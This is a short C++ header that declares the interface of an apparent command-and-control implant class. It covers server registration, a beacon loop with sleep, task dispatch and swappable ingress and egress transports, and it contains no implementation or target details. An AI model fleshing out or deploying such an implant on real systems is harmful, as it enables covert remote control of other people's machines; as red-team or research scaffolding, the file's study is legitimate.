#pragma once

#include <string>
#include <map>
#include <vector>
#include <iostream>
#include <thread>
#include <chrono>
#include "data/msgpack/msgpack.h"
#include "comms/transport.h"
class C2Implant {
public:
    // --- Instance Data (Specific to this implant) ---
    // Naming: snake_case_ for members
    std::string implant_uuid_;

    // --- comms Methods ---

    //init's everyhting for the cycle
    void init();

    //registers to server
    int register_implant();

    // main loop
    void cycle();
    void update_transports();

    void dispatch_to_threadpool(const nlohmann::json& task);
    void dispatch_to_child_router(const nlohmann::json& task);

private:
    // Internal helper to wrap sleep logic
    void sleep_implant();
    void handle_tasks(const nlohmann::json& incoming);

    HANDLE h_inbox = INVALID_HANDLE_VALUE;
    HANDLE h_outbox = INVALID_HANDLE_VALUE;


    IIngressTransport* current_ingress_ = nullptr;
    IEgressTransport* current_egress_ = nullptr;
};